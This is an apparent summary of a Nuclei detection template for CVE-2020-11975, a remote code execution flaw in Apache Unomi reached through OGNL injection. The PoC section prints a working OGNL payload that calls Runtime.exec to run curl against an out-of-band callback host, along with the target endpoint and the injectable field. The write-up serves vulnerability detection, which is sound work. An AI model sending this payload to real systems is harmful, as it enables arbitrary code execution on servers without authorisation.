---
cve_id: CVE-2020-11975
template_path: nuclei-templates/http/cves/2020/CVE-2020-11975.yaml
affected_product: Apache Unomi
severity: critical
authentication: none
external_callback: true
affected_versions: < 1.5.2
preconditions: []
poc_classification: rce
---

## Vulnerability

Apache Unomi contains a critical remote code execution vulnerability that allows attackers to execute arbitrary code through OGNL (Object-Graph Navigation Language) scripting injection in conditions. The vulnerability exists because Unomi permits conditions to use OGNL scripting, which provides the capability to invoke static Java classes from the JDK. This enables attackers to execute code with the permission level of the running Java process, potentially leading to complete system compromise.

The vulnerability is classified as CWE-94 (Improper Control of Generation of Code - Code Injection) with a CVSS score of 9.8 (Critical). The attack vector is network-based, requires low complexity, no privileges, and no user interaction. The EPSS score of 0.87098 (99.425th percentile) indicates a very high probability of exploitation in the wild.

## PoC / Detection

Classification: rce

The template detects this vulnerability by sending a POST request to `/context.json` with a malicious JSON payload that exploits OGNL injection in the `profilePropertyCondition` type. The payload injects OGNL expressions into the `propertyName` parameter:

```
(#r=@java.lang.Runtime@getRuntime()).(#r.exec("curl {{interactsh-url}}"))
```

This expression obtains the Java Runtime instance and executes a curl command to trigger an out-of-band DNS/HTTP callback to an attacker-controlled Interactsh server. The template verifies successful exploitation by:

1. Detecting DNS protocol interaction via the Interactsh callback mechanism
2. Confirming the response contains expected JSON fields (`profileId`, `sessionId`)
3. Validating the response has `application/json` content type
4. Checking for HTTP status codes 200 or 500

The detection uses a non-destructive proof-of-concept that demonstrates code execution capability through external callbacks rather than executing harmful commands on the target system.

## References

- https://xz.aliyun.com/news/8157
- https://github.com/1135/unomi_exploit
- https://unomi.apache.org/security/cve-2020-11975.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-11975
